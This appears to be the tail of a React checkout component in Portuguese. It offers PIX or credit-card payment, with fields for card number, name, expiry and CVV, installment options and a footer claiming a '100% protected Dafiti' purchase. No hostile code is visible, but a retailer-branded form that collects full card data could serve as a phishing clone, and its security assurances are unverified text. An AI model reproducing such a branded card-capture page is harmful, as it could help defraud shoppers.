                    </button>
                  </div>

                  {/* TABS */}
                  <div className="grid grid-cols-2 gap-3">
                    <button
                      type="button"
                      onClick={() => setMethod("pix")}
                      className={`p-4 rounded-2xl border text-left transition-all relative ${
                        method === "pix"
                          ? "border-emerald-600 bg-emerald-50/40 ring-2 ring-emerald-600"
                          : "border-gray-200 hover:border-gray-300 bg-white"
                      }`}
                    >
                      <div className="flex items-center justify-between mb-1.5">
                        <span className="font-black text-sm text-gray-900 flex items-center gap-1.5">
                          <QrCode size={18} className="text-emerald-600" /> PIX
                        </span>
                        <span className="bg-emerald-600 text-white text-[9px] font-extrabold px-2 py-0.5 rounded-full">
                          5% OFF
                        </span>
                      </div>
                      <div className="text-lg font-black text-emerald-700">{brl(TOTAL_PRICE_CENTS)}</div>
                      <div className="text-[11px] text-gray-500">Aprovação imediata</div>
                    </button>

                    <button
                      type="button"
                      onClick={() => setMethod("card")}
                      className={`p-4 rounded-2xl border text-left transition-all ${
                        method === "card"
                          ? "border-black bg-gray-50 ring-2 ring-black"
                          : "border-gray-200 hover:border-gray-300 bg-white"
                      }`}
                    >
                      <div className="flex items-center justify-between mb-1.5">
                        <span className="font-black text-sm text-gray-900 flex items-center gap-1.5">
                          <CreditCard size={18} /> Cartão
                        </span>
                        <span className="text-[10px] text-gray-500 font-bold">Até 6x</span>
                      </div>
                      <div className="text-lg font-black text-gray-900">{brl(TOTAL_PRICE_CENTS)}</div>
                      <div className="text-[11px] text-gray-500">Em até 6x sem juros</div>
                    </button>
                  </div>

                  {/* CARTÃO DE CRÉDITO FIELDS */}
                  {method === "card" && (
                    <div className="pt-3 border-t border-gray-100 space-y-3.5 animate-in fade-in duration-200">
                      <div>
                        <label className="block text-[11px] font-bold uppercase tracking-wider text-gray-600 mb-1">
                          Número do Cartão
                        </label>
                        <input
                          type="text"
                          placeholder="0000 0000 0000 0000"
                          value={card.number}
                          onChange={(e) => setCard({ ...card, number: maskCardNumber(e.target.value) })}
                          className={`${inputCls} font-mono`}
                        />
                      </div>
                      <div>
                        <label className="block text-[11px] font-bold uppercase tracking-wider text-gray-600 mb-1">
                          Nome Impresso no Cartão
                        </label>
                        <input
                          type="text"
                          placeholder="NOME COMO NO CARTÃO"
                          value={card.holderName}
                          onChange={(e) => setCard({ ...card, holderName: e.target.value.toUpperCase() })}
                          className={`${inputCls} uppercase`}
                        />
                      </div>
                      <div className="grid grid-cols-2 gap-3">
                        <div>
                          <label className="block text-[11px] font-bold uppercase tracking-wider text-gray-600 mb-1">
                            Validade (MM/AA)
                          </label>
                          <input
                            type="text"
                            placeholder="MM/AA"
                            value={card.expiry}
                            onChange={(e) => setCard({ ...card, expiry: maskExpiry(e.target.value) })}
                            className={`${inputCls} font-mono text-center`}
                          />
                        </div>
                        <div>
                          <label className="block text-[11px] font-bold uppercase tracking-wider text-gray-600 mb-1">
                            CVV
                          </label>
                          <input
                            type="password"
                            placeholder="123"
                            maxLength={4}
                            value={card.cvv}
                            onChange={(e) => setCard({ ...card, cvv: onlyDigits(e.target.value) })}
                            className={`${inputCls} font-mono text-center`}
                          />
                        </div>
                      </div>
                      <div>
                        <label className="block text-[11px] font-bold uppercase tracking-wider text-gray-600 mb-1">
                          Parcelamento
                        </label>
                        <select
                          value={card.installments}
                          onChange={(e) => setCard({ ...card, installments: Number(e.target.value) })}
                          className={inputCls}
                        >
                          <option value={1}>1x de {brl(TOTAL_PRICE_CENTS)} sem juros</option>
                          <option value={2}>2x de {brl(TOTAL_PRICE_CENTS / 2)} sem juros</option>
                          <option value={3}>3x de {brl(TOTAL_PRICE_CENTS / 3)} sem juros</option>
                          <option value={4}>4x de {brl(TOTAL_PRICE_CENTS / 4)} sem juros</option>
                          <option value={5}>5x de {brl(TOTAL_PRICE_CENTS / 5)} sem juros</option>
                          <option value={6}>6x de {brl(TOTAL_PRICE_CENTS / 6)} sem juros</option>
                        </select>
                      </div>
                    </div>
                  )}

                  {error && (
                    <div className="flex items-center gap-2 p-3 bg-rose-50 border border-rose-200 text-rose-700 text-xs rounded-2xl font-bold">
                      <AlertCircle size={16} className="shrink-0" />
                      <span>{error}</span>
                    </div>
                  )}

                  {/* RESUMO DE VALORES */}
                  <div className="bg-gray-50 rounded-2xl p-4 text-xs space-y-1.5 border border-gray-100">
                    <div className="flex justify-between text-gray-600">
                      <span>Subtotal:</span>
                      <span className="font-bold text-gray-900">{brl(PRODUCT_PRICE_CENTS)}</span>
                    </div>
                    <div className="flex justify-between text-gray-600">
                      <span className="flex items-center gap-1">
                        <Truck size={12} className="text-amber-600" /> Frete (Correios):
                      </span>
                      <span className="font-bold text-amber-700">{brl(SHIPPING_FEE_CENTS)}</span>
                    </div>
                    <div className="border-t border-dashed border-gray-200 pt-2 flex justify-between items-baseline">
                      <span className="font-bold text-gray-900">Total a Pagar:</span>
                      <span className="text-lg font-black text-gray-900">{brl(TOTAL_PRICE_CENTS)}</span>
                    </div>
                  </div>

                  {/* SUBMIT BUTTON */}
                  <div className="flex gap-3 pt-1">
                    <button
                      type="button"
                      onClick={() => {
                        setError(null);
                        setCurrentStep(2);
                      }}
                      className="px-5 py-4 border border-gray-300 hover:border-black rounded-2xl text-xs font-bold uppercase tracking-wider transition-all"
                    >
                      Voltar
                    </button>
                    <button
                      type="submit"
                      disabled={loading}
                      className="flex-1 bg-black hover:bg-neutral-900 active:scale-[0.99] disabled:opacity-50 text-white font-black py-4 rounded-2xl text-xs sm:text-sm uppercase tracking-widest transition-all shadow-lg flex items-center justify-center gap-2"
                    >
                      {loading ? (
                        <>
                          <span className="w-4 h-4 border-2 border-white border-t-transparent rounded-full animate-spin" />
                          <span>Processando...</span>
                        </>
                      ) : (
                        <>
                          <Lock size={15} />
                          <span>
                            {method === "pix"
                              ? `Efetuar Pagamento • ${brl(TOTAL_PRICE_CENTS)}`
                              : `Pagar com Cartão • ${brl(TOTAL_PRICE_CENTS)}`}
                          </span>
                        </>
                      )}
                    </button>
                  </div>

                  <div className="pt-1 flex items-center justify-center">
                    <img
                      src={paymentBadgesImg}
                      alt="Bandeiras de pagamento"
                      className="h-6 w-auto object-contain opacity-80"
                    />
                  </div>
                </section>
              </form>
            )}
          </div>
        )}

        {/* SECURITY FOOTER */}
        {currentStep !== 4 && (
          <div className="bg-white/80 rounded-2xl p-4 border border-gray-200 text-xs text-gray-600 flex items-start gap-3">
            <ShieldCheck size={20} className="text-emerald-600 shrink-0 mt-0.5" />
            <div>
              <p className="font-bold text-gray-900">Compra 100% Protegida Dafiti</p>
              <p className="text-[11px] text-gray-500 leading-relaxed mt-0.5">
                Seus dados são criptografados com certificado SSL de 256 bits. Pagamento processado pelo gateway oficial com total segurança.
              </p>
            </div>
          </div>
        )}
      </main>
    </div>
  );
}
